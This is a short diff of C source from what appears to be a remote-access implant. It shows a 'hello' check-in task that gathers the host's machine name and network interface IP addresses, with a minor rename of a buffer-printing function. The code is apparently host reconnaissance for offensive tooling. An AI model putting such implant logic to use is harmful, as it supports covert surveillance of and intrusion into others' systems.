@@ -83,13 +83,13 @@ D_SEC( B ) DWORD TaskHello( _In_ PROGUE_CTX Context, _In_ USHORT Uid, _In_ PVOID
 			if ( ( Dsk = OsMachineName() ) != NULL ) {
 				if ( ( Pai = OsIpAddress() ) != NULL ) {
 					/* Append the desktop name and string */
-					if ( BufferPrintf( Out, C_PTR( G_PTR( "%s\t" ) ), Dsk ) ) {
+					if ( BufferPrintfA( Out, C_PTR( G_PTR( "%s\t" ) ), Dsk ) ) {
 						/* Enumerate individual entries */
 						for ( Nxt = C_PTR( Pai ) ; Nxt != NULL ; Nxt = Nxt->Next ) {
 							/* Does not contain 0.0.0.0? */
 							if ( HashString( Nxt->IpAddressList.IpAddress.String, 0 ) != 0xe176f26f ) {
 								/* Insert the interface name and string */
-								BufferPrintf( Out, C_PTR( G_PTR( "%s:%s;" ) ), Nxt->Description, Nxt->IpAddressList.IpAddress.String );
+								BufferPrintfA( Out, C_PTR( G_PTR( "%s:%s;" ) ), Nxt->Description, Nxt->IpAddressList.IpAddress.String );
 							};
 						};
 						/* Add output and set return value */
